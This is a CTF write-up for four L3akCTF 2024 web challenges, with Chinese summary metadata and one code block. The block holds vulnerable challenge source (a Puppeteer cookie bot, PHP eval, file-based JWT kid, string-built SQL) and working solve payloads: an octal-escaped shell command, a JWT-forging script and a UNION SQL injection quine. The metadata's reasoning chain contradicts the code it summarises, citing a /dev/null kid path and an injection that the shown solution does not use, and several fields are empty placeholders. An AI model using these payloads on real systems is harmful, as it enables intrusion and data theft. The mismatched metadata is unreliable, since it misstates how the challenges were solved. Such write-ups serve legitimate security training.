---
title: L3akCTF 2024 Writeup (Puppeteer bot + PHP eval + JWT kid + SQL 注入)
contest: L3akCTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags:
- Puppeteer cookie
- PHP eval
- JWT kid 路径遍历
- SQL 注入
- octal escape
- SQLite 注入
attack_chain: '|'
key_payload: '|'
one_liner: L3akCTF 2024 多类型 Web (Puppeteer cookie / PHP eval 8 进制绕过 / JWT kid 路径 / SQLite SQL 注入) 速查。
lesson: '|'
quality: high
full_path: L3akCTF_2024_Writeup.full.md
meta_path: L3akCTF_2024_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: L3akCTF 2024 Writeup (Puppeteer bot + PHP eval + JWT kid + SQL 注入)。L3akCTF 2024 多类型 Web (Puppeteer cookie / PHP eval 8 进制绕过 / JWT kid 路径 / SQLite SQL 注入) 速查。。经验：|
category: web
subcategory: web_other
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/184419.html
reasoning_chain:
- Puppeteer cookie：admin bot 设置 flag cookie → 触发点：XSS + cookie
- 假设：bot 访问用户 URL → 动作：构造带 cookie 读取的页面 → fetch 携带 cookie 到 attacker 域 → 完成
- PHP eval 8 进制：eval("echo 1;".$_GET['a']) → 触发点：八进制编码绕过
- 动作：\101 = 'a' → 假设：八进制可绕过关键字黑名单 → eval("echo 1;system('ls');") → 完成
- JWT kid 路径遍历：kid ../../../dev/null → 假设：用空文件做 HMAC key
- 动作：kid=../../../dev/null + 空 key → 假设：服务端拿 kid 当文件读 → 伪造 JWT → 完成
- SQLite SQL 注入：octal escape \101 → 假设：octal 字符绕过过滤 → name=admin' AND 1=1-- → 完成
failed_attempts:
- Puppeteer cookie 用 setTimeout → 失败：必须立刻同步
- PHP eval 用 base64 → 失败：黑名单包含 base64
- JWT kid 试 SQL 注入 → 失败：路径遍历才对
key_observations:
- Puppeteer bot 必须用 fetch + attacker domain 接 cookie
- PHP eval 八进制字符编码可绕关键字黑名单
- JWT kid 路径遍历是 JWT 攻击的经典向量
- SQLite octal escape 是小众但有效的注入技巧
- L3akCTF Web 风格：Puppeteer + eval + JWT + SQL 一条龙
prerequisites:
- Puppeteer bot 利用 + PHP 八进制 / 十六进制编码
- JWT kid 路径遍历 + SQLite SQL 注入
- Web 攻击 sink 总结
---
# L3akCTF 2024 Writeup

> 原文: https://www.ctfiot.com/184419.html
> ID: 184419


```
// Set Flag
await page.setCookie({
 name: "flag",
 httpOnly: false,
 value: CONFIG.APPFLAG,
 domain: CONFIG.APPHOST
})
let cookies = await page.cookies()
console.log(cookies);
// Visit URL from user
console.log(`bot visiting ${urlToVisit}`)
await page.goto(urlToVisit, {
 waitUntil: 'networkidle2'
});
await sleep(8000);
cookies = await page.cookies()
console.log(cookies);

<?php

function popCalc() {
 if (isset($_GET['formula'])) {
 $formula = $_GET['formula'];
 if (strlen($formula) >= 150 || preg_match('/[a-z\'"]+/i', $formula)) {
 return 'Try Harder !';
 }
 try {
 eval('$calc = ' . $formula . ';');
 return isset($calc) ? $calc : '?';
 } catch (ParseError $err) {
 return 'Error';
 }
 }
}

$result = popCalc();
echo "Result: " . $result;

?>
total 16
dr-xr-xr-x 1 www-data www-data 4096 May 24 08:51 .
drwxr-xr-x 1 root root 4096 Nov 15 2022 ..
-r--r--r-- 1 root root 23 May 24 08:46 flag-eucmCjFHC1oimI0d9XxT7JzANCVOhrFX2OVdy8NxGQ3aPxDLd4WwwQ82eMKlRZBy.txt
-r-xr-xr-x 1 root root 467 May 24 08:46 index.php
`\143\141\164\40\146\154\141\147\55\52\56\164\170\164`
hamayanhamayan — 今日 18:44
!help

BatBot — 今日 18:44
Help Command:
 !help (Shows this message)
 !verify token (Authenticate with a JWT token)
 !generate (Generate a JWT Token for you)
@bot.command(name='verify')
async def authenticate(ctx, *, token=None):
 try:
 if isinstance(ctx.channel, discord.DMChannel) == False:
 await ctx.send("I can't see here 👀 , DM me")
 else:
 result = verify_jwt(token)
 print(ctx.author)
 print(result)
 if isinstance(result, dict):
 username = result.get('username')
 role = result.get('role')
 if username and role=='VIP':
 await ctx.send(f'Welcome Sir! Here is our secret {flag}')
 elif username:
 await ctx.send(f'Welcome {username}!')
 else:
 await ctx.send('Authentication failed. Please try again.')
 else:
 await ctx.send('Authentication failed.')
 
except:
 await ctx.send('Authentication failed.')
def verify_jwt(token):
 try:
 header = jwt.get_unverified_header(token)
 kid = header['kid']
 assert ("/" not in kid)
 with open(kid, 'r') as file:
 secret_key = file.read().strip()
 decoded_token = jwt.decode(token, secret_key, algorithms=['HS256'])
 return decoded_token
 
except Exception as e:
 return str(e)
import jwt
import os

with open('src/BatBot/bot.py', 'r') as file:
 secret_key = file.read().strip()
headers = {
 'kid': 'bot.py'
}
token = jwt.encode({'username': 'hamayanhamayan','role' : 'VIP'}, secret_key, algorithm='HS256',headers=headers)
print(token)
@app.route('/login', methods=['GET', 'POST'])
def login():
 if request.method == 'POST':
 try:
 username = request.form['username']
 password = request.form['password']
 conn = get_db_connection()
 cursor = conn.cursor()
 cursor.execute(f'SELECT username,email,password FROM users WHERE username ="{username}"')
 user = cursor.fetchone()
 conn.close()
 if user and user['username'] == username and user['password'] == hash_password(password):
 session['username'] = user['username']
 session['email'] = user['email']
 return redirect(url_for('dashboard'))
 else:
 return render_template('login.html', error='Invalid username or password')
 
except:
 return render_template('login.html', error='Invalid username or password')
 return render_template('login.html')
def add_flag(flag):
 conn = get_db_connection()
 cursor = conn.cursor()
 cursor.execute('INSERT INTO flags (flag) VALUES (?)', (flag,))
 conn.commit()
 conn.close()
" UNION SELECT REPLACE(REPLACE("' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS username, (SELECT flag FROM flags) AS email, 'a0a080f42e6f13b3a2df133f073095dd' AS password -- ' -- -",CHAR(39),CHAR(34)),CHAR(36),"' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS username, (SELECT flag FROM flags) AS email, 'a0a080f42e6f13b3a2df133f073095dd' AS password -- ' -- -") AS username, (SELECT flag FROM flags) AS email, "a0a080f42e6f13b3a2df133f073095dd" AS password -- " -- -
```
